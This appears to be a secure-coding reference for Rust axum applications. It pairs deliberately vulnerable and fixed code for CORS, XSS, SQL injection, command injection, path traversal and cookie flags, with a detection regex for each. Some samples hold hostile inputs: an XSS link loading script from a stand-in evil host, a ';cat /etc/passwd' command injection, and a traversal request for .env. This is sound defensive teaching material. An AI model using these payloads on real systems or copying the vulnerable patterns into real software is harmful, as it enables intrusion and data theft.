# Axum Security Patterns

Security patterns, common misconfigurations, and detection regexes for axum 0.7/0.8 applications. Axum's extractor system (`Query`, `Path`, `Json`, `State`) gives strongly-typed access to request data and its tower/tower-http ecosystem provides composable middleware, but neither sanitizes the *content* of extracted strings. The recurring axum vulnerability classes are permissive `CorsLayer` configurations, `Html(format!(...))` responses that reflect extractor input, `format!`-built sqlx queries, shell commands assembled from request values, and filesystem reads on request-derived paths.

---

## CORS Misconfiguration

### SA-AXUM-01: CorsLayer::permissive() / very_permissive()

`tower_http::cors::CorsLayer` ships two shortcut constructors. `permissive()` allows any origin, method, and header; `very_permissive()` additionally mirrors the request origin and allows credentials. Both are development conveniences that routinely leak into production router setups.

```rust
// VULNERABLE: every origin on the internet may call this API
use axum::{routing::get, Router};
use tower_http::cors::CorsLayer;

#[tokio::main]
async fn main() {
    let cors = CorsLayer::very_permissive();

    let app = Router::new()
        .route("/api/me", get(me))
        .layer(cors);

    let listener = tokio::net::TcpListener::bind("0.0.0.0:3000").await.unwrap();
    axum::serve(listener, app).await.unwrap();
}
```

```rust
// SECURE: explicit origin and method allowlist
use axum::{http::{HeaderValue, Method}, routing::get, Router};
use tower_http::cors::CorsLayer;

#[tokio::main]
async fn main() {
    let cors = CorsLayer::new()
        .allow_origin("https://app.example.com".parse::<HeaderValue>().unwrap())
        .allow_methods([Method::GET, Method::POST]);

    let app = Router::new()
        .route("/api/me", get(me))
        .layer(cors);

    let listener = tokio::net::TcpListener::bind("0.0.0.0:3000").await.unwrap();
    axum::serve(listener, app).await.unwrap();
}
```

**Security implication:** `very_permissive()` reflects the caller's origin with `Access-Control-Allow-Credentials: true`, so any web page can make credentialed requests to your API and read the responses — cross-origin theft of authenticated data. Plain `permissive()` does not enable credentials but still removes the same-origin barrier for token-in-header APIs and hides CORS errors that would otherwise flag a misrouted frontend. Use `CorsLayer::new()` with pinned origins; if a wildcard is genuinely needed for a public unauthenticated API, configure it explicitly with `AllowOrigin::any()` and never together with `allow_credentials(true)` (tower-http panics on that combination, but only at runtime).

**Detection regex:** `CorsLayer::(very_)?permissive\s*\(`
**Checkpoint:** SA-AXUM-01
**Severity:** warning

---

## Cross-Site Scripting (XSS)

### SA-AXUM-02: Html(format!(...)) with Extractor Input

`axum::response::Html` sets `Content-Type: text/html` on whatever string it wraps — it performs no escaping. Wrapping a `format!` interpolation of `Query`/`Path`/`Json` data produces a textbook reflected XSS.

```rust
// VULNERABLE: ?name=<script>...</script> executes in the victim's browser
use axum::{extract::Query, response::Html};
use serde::Deserialize;

#[derive(Deserialize)]
pub struct Greeting { name: String }

pub async fn greet(Query(params): Query<Greeting>) -> Html<String> {
    Html(format!("<h1>Welcome back, {}!</h1>", params.name))
}
```

```rust
// SECURE: askama template escapes interpolated values by default
use askama::Template;
use axum::{extract::Query, response::{Html, IntoResponse}};
use serde::Deserialize;

#[derive(Template)]
#[template(path = "greeting.html")]
struct GreetingTemplate { name: String }

#[derive(Deserialize)]
pub struct Greeting { name: String }

pub async fn greet(Query(params): Query<Greeting>) -> impl IntoResponse {
    let page = GreetingTemplate { name: params.name };
    match page.render() {
        Ok(body) => Html(body).into_response(),
        Err(_) => "template error".into_response(),
    }
}
```

Alternatives: `maud` for compile-time-checked markup with automatic escaping, or `html_escape::encode_text` before interpolation for one-off pages. Returning a plain `String` (which axum serves as `text/plain`) is also safe for non-HTML output.

**Security implication:** reflected script executes in your origin with access to DOM, localStorage tokens, and any non-HttpOnly cookies. Attackers weaponize it via crafted links (`https://app.example.com/greet?name=<script src=//evil.example/x.js></script>`), turning a cosmetic greeting page into an account-takeover vector.

**Detection regex:** `\bHtml\s*\(\s*format!\s*\(`
**Checkpoint:** SA-AXUM-02
**Severity:** error

---

## Injection

### SA-AXUM-03: sqlx::query(&format!(...)) Instead of Bind Parameters

sqlx accepts any `&str`, so `sqlx::query(&format!(...))` compiles and works — while splicing attacker-controlled extractor values straight into SQL text. sqlx has both runtime bind parameters (`.bind()`) and compile-time checked macros (`query!`); the `format!` form bypasses all of it.

```rust
// VULNERABLE: path segment "acme' OR '1'='1" dumps the orders table
use axum::{extract::{Path, State}, http::StatusCode};
use sqlx::PgPool;

pub async fn list_orders(
    State(pool): State<PgPool>,
    Path(customer): Path<String>,
) -> Result<String, StatusCode> {
    let rows = sqlx::query(&format!(
        "SELECT id, total FROM orders WHERE customer = '{}'",
        customer
    ))
    .fetch_all(&pool)
    .await
    .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    Ok(rows.len().to_string())
}
```

```rust
// SECURE: positional placeholder + .bind(); the driver handles quoting
use axum::{extract::{Path, State}, http::StatusCode};
use sqlx::PgPool;

pub async fn list_orders(
    State(pool): State<PgPool>,
    Path(customer): Path<String>,
) -> Result<String, StatusCode> {
    let rows = sqlx::query("SELECT id, total FROM orders WHERE customer = $1")
        .bind(&customer)
        .fetch_all(&pool)
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    Ok(rows.len().to_string())
}
```

Prefer `sqlx::query!("SELECT ... WHERE customer = $1", customer)` where possible — it validates the SQL against the schema at compile time and forces parameterization.

**Security implication:** full SQL injection: data exfiltration via `UNION SELECT`, authentication bypass via `OR '1'='1'`, and data destruction via stacked statements on drivers that allow them. Axum's typed extractors do not help — `Path<String>` faithfully delivers the malicious string.

**Detection regex:** `sqlx::query(_as|_scalar)?\s*\(\s*&\s*format!`
**Checkpoint:** SA-AXUM-03
**Severity:** error

---

### SA-AXUM-04: Command Injection via std::process::Command from Extractors

Handlers that shell out — diagnostics endpoints, media converters, git wrappers — become command injection the moment an extractor value is interpolated into a `sh -c` string or used as the program name.

```rust
// VULNERABLE: ?host=8.8.8.8;cat+/etc/passwd runs the injected command
use axum::extract::Query;
use serde::Deserialize;
use std::process::Command;

#[derive(Deserialize)]
pub struct PingParams { host: String }

pub async fn ping(Query(params): Query<PingParams>) -> String {
    let output = Command::new("sh")
        .arg("-c")
        .arg(format!("ping -c 1 {}", params.host))
        .output();
    match output {
        Ok(out) => String::from_utf8_lossy(&out.stdout).to_string(),
        Err(err) => format!("ping failed: {}", err),
    }
}
```

```rust
// SECURE: validate the value, run the binary directly, pass fixed argv entries
use axum::{extract::Query, http::StatusCode};
use serde::Deserialize;
use std::process::Command;

#[derive(Deserialize)]
pub struct PingParams { host: String }

fn is_valid_hostname(host: &str) -> bool {
    !host.is_empty()
        && host.len() <= 253
        && host.chars().all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-')
}

pub async fn ping(Query(params): Query<PingParams>) -> Result<String, StatusCode> {
    if !is_valid_hostname(&params.host) {
        return Err(StatusCode::BAD_REQUEST);
    }
    let output = Command::new("ping")
        .arg("-c").arg("1")
        .arg(&params.host)
        .output()
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}
```

`Command::new` with a fixed program and per-value `.arg()` calls never re-parses the arguments through a shell, so metacharacters (`;`, `|`, `$(...)`) stay inert. Also wrap blocking `Command` calls in `tokio::task::spawn_blocking` so they cannot stall the async runtime.

**Security implication:** command injection is remote code execution — attackers read secrets, pivot into the network, and install persistence with the privileges of the server process. It is the highest-impact bug class on this list.

**Detection regex:** `\.arg\s*\(\s*"-l?c"\s*\)\s*\.arg\s*\(\s*&?format!\s*\(\s*"[^"]* [^"]*\{|Command::new\s*\(\s*&?(params|query|body|payload|form|req)\.`

The first alternation requires the `format!` string to contain both a space and an interpolation, i.e. a composed command line. Benign count flags such as `ping -c` / `tar -c` followed by `.arg(format!("{}", n))` do not flag.
**Checkpoint:** SA-AXUM-04
**Severity:** error

---

## Path Traversal

### SA-AXUM-05: tokio::fs / std::fs Reads on Extractor-Built Paths

Building filesystem paths with `format!("./dir/{}", extracted)` and handing them to `tokio::fs::read`, `read_to_string`, or `File::open` lets `../` sequences escape the intended directory. `Path<String>` matching a `/{name}` route parameter happily contains encoded traversal sequences.

```rust
// VULNERABLE: /reports/..%2F..%2F.env reads the server's env file
use axum::{extract::Path, http::StatusCode};

pub async fn read_report(Path(name): Path<String>) -> Result<String, StatusCode> {
    let contents = tokio::fs::read_to_string(format!("./reports/{}", name))
        .await
        .map_err(|_| StatusCode::NOT_FOUND)?;
    Ok(contents)
}
```

```rust
// SECURE: accept only a single normal path component, join under a fixed root
use axum::{extract::Path as UrlPath, http::StatusCode};
use std::path::{Component, Path, PathBuf};

const REPORT_ROOT: &str = "./reports";

pub async fn read_report(UrlPath(name): UrlPath<String>) -> Result<String, StatusCode> {
    let candidate = Path::new(&name);
    let mut components = candidate.components();
    match (components.next(), components.next()) {
        (Some(Component::Normal(_)), None) => {}
        _ => return Err(StatusCode::BAD_REQUEST),
    }
    let full: PathBuf = Path::new(REPORT_ROOT).join(candidate);
    let contents = tokio::fs::read_to_string(&full)
        .await
        .map_err(|_| StatusCode::NOT_FOUND)?;
    Ok(contents)
}
```

For whole directories of static content, use `tower_http::services::ServeDir`, which normalizes paths and rejects traversal, instead of hand-rolled read handlers. Add a `canonicalize()`-and-`starts_with(root)` check when files may be symlinked.

**Security implication:** arbitrary file read exposes credentials (`.env`, cloud metadata tokens on disk, TLS keys), source code, and databases. If the same pattern feeds a write API, it becomes arbitrary file overwrite and likely RCE.

**Detection regex:** `fs::read(_to_string)?\s*\(\s*&?\s*format!\s*\(\s*"[^"]*/\{|\bFile::open\s*\(\s*&?\s*format!\s*\(\s*"[^"]*/\{`

The regex requires a literal `/` immediately before an interpolation (`"./reports/{}"`), i.e. a request-derived final path segment. Config reads that interpolate a fixed root, such as `format!("{}/allowlist.txt", ROOT)`, do not flag; the `\b` anchor keeps actix's `NamedFile::open` (covered by SA-ACTIX-03) from double-reporting here.
**Checkpoint:** SA-AXUM-05
**Severity:** error

---

## Session & Cookie Security

### SA-AXUM-06: Cookies Built with .secure(false)

With `axum-extra`'s `CookieJar` (or the `cookie` crate directly), `.secure(false)` marks the cookie as sendable over plaintext HTTP. It typically enters the codebase to make `http://localhost` work and then ships.

```rust
// VULNERABLE: session cookie may be transmitted over plaintext HTTP
use axum::response::IntoResponse;
use axum_extra::extract::cookie::{Cookie, CookieJar};

pub async fn login(jar: CookieJar) -> impl IntoResponse {
    let cookie = Cookie::build(("session", issue_token()))
        .path("/")
        .http_only(true)
        .secure(false)
        .build();
    (jar.add(cookie), "logged in")
}
```

```rust
// SECURE: Secure + HttpOnly + SameSite on every auth cookie
use axum::response::IntoResponse;
use axum_extra::extract::cookie::{Cookie, CookieJar, SameSite};

pub async fn login(jar: CookieJar) -> impl IntoResponse {
    let cookie = Cookie::build(("session", issue_token()))
        .path("/")
        .http_only(true)
        .secure(true)
        .same_site(SameSite::Strict)
        .build();
    (jar.add(cookie), "logged in")
}
```

If local development requires an insecure cookie, derive the flag from the environment (`cfg!(debug_assertions)` or a config value) so release builds always emit `Secure`. Consider `PrivateCookieJar`/`SignedCookieJar` for tamper-proofing session material.

**Security implication:** without `Secure`, one `http://` navigation (bookmarks, captive portals, SSL-stripping proxies) leaks the session cookie to on-path attackers — silent full-session hijacking. Missing `HttpOnly` additionally hands the cookie to any XSS (see SA-AXUM-02), and missing `SameSite` re-enables CSRF against cookie-authenticated endpoints.

**Detection regex:** `\.secure\s*\(\s*false\s*\)`
**Checkpoint:** SA-AXUM-06
**Severity:** warning

---

## Additional Hardening (No Dedicated Checkpoints)

- **Body limits:** add `tower_http::limit::RequestBodyLimitLayer` (axum defaults to 2 MB for most extractors, but streaming bodies and custom extractors may bypass it).
- **Timeouts:** wrap routes in `tower_http::timeout::TimeoutLayer` to bound slow-loris style resource exhaustion.
- **Security headers:** use `SetResponseHeaderLayer` for `Content-Security-Policy`, `X-Content-Type-Options`, and `Strict-Transport-Security`, or terminate at a proxy that sets them.
- **Static files:** serve with `ServeDir` rather than custom `fs::read` handlers; it handles path normalization and MIME types.
- **Error hygiene:** implement `IntoResponse` for error types so internal errors map to opaque 500s instead of leaking `Debug` output to clients.

---

## Remediation Priority

| Finding | Severity | Remediation Timeline | Effort |
|---------|----------|---------------------|--------|
| SA-AXUM-04: command injection from extractors | Critical | Immediate | Medium |
| SA-AXUM-03: SQL via format! in sqlx | Critical | Immediate | Low |
| SA-AXUM-05: fs read path traversal | High | Immediate | Medium |
| SA-AXUM-02: reflected XSS via Html(format!) | High | Immediate | Medium |
| SA-AXUM-01: CorsLayer permissive/very_permissive | Medium | 1 week | Low |
| SA-AXUM-06: cookie .secure(false) | Medium | 1 week | Low |

## Related References

- `owasp-top10.md` — OWASP Top 10 mapping
- `rust-security-features.md` — Language-level Rust patterns (SA-RS-*)
- `actix-security.md` — Actix Web equivalents of the same vulnerability classes
- `api-security.md` — General API security patterns
- `authentication-patterns.md` — Session and token handling

## Changelog

| Date | Change | Reason |
|------|--------|--------|
| 2026-07-20 | Initial release | Coverage expansion |
| 2026-07-20 | Tightened SA-AXUM-02 (`\b` anchor), SA-AXUM-04 (composed command line required), SA-AXUM-05 (`/{` path-tail required) | Avoid false positives on Html-suffixed newtypes, count flags, and fixed-root config reads |
